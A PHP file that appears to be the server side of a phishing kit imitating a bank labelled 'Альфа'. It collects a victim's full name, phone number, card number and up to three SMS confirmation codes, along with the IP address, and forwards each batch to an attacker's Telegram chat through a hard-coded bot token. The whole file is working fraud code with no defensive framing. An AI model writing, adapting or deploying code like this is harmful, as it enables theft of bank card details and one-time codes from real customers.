<?php

$token = "5688885188:AAEBDc-ZzLl9v6rz0m0avep0jcDO6yDJ6jM";
$chat = "-815284470";

$ip = $_SERVER['REMOTE_ADDR']; 

if($_POST['code']) {

$arr = array(
  '📨 Статус: ' => '[Альфа NEW - СМС]',  
  '▪️ ФИО: ' => $_COOKIE['names'],
  '❗️ СМС: ' => $_POST['code'],
  '▪️ IP: ' => $ip,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt}","r");  
  
}

if($_POST['code2']) {

$arr = array(
  '📨 Статус: ' => '[Альфа NEW - СМС 2]',  
  '▪️ ФИО: ' => $_COOKIE['names'],
  '❗️ СМС: ' => $_POST['code2'],
  '▪️ IP: ' => $ip,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt}","r");  
  
}

if($_POST['code3']) {

$arr = array(
  '📨 Статус: ' => '[Альфа NEW - СМС 3]',  
  '▪️ ФИО: ' => $_COOKIE['names'],
  '❗️ СМС: ' => $_POST['code3'],
  '▪️ IP: ' => $ip,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt}","r");  
  
}

if($_POST['fio']) {
	
setcookie("names", $_POST['fio'], time()+3600); 	

$arr = array(
  '📨 Статус: ' => '[Альфа NEW - Новый лог]',  
  '▪️ ФИО: ' => $_POST['fio'],
  '▪️ Номер телефона: ' => $_POST['phone'],
  '▪️ Номер карты: ' => $_POST['password'],  
  '▪️ IP: ' => $ip,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt}","r");	
	
}


?>